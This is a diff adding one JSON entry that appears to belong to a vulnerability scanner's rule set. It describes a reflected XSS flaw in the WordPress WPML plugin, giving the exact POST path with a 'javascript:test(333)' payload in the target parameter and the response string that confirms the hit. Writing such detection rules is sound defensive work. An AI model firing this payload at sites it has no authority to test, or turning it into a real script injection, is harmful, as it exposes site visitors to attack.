@@ -1,0 +1,23 @@
+{
+  "cms": "wordpress",
+  "version": "",
+  "author": "wolf",
+  "desc": "WordPress wpml Plugin 存在反射型XSS漏洞",
+  "tags": [
+    "XSS"
+  ],
+  "refer": [
+    "",
+    ""
+  ],
+  "request": {
+    "path": "/index.php?icl_action=reminder_popup&target=javascript:test(333);//",
+    "method": "POST",
+    "parameter": ""
+  },
+  "response": {
+    "position": "body",
+    "regex": false,
+    "match": "\"javascript:test(333);//"
+  }
+}
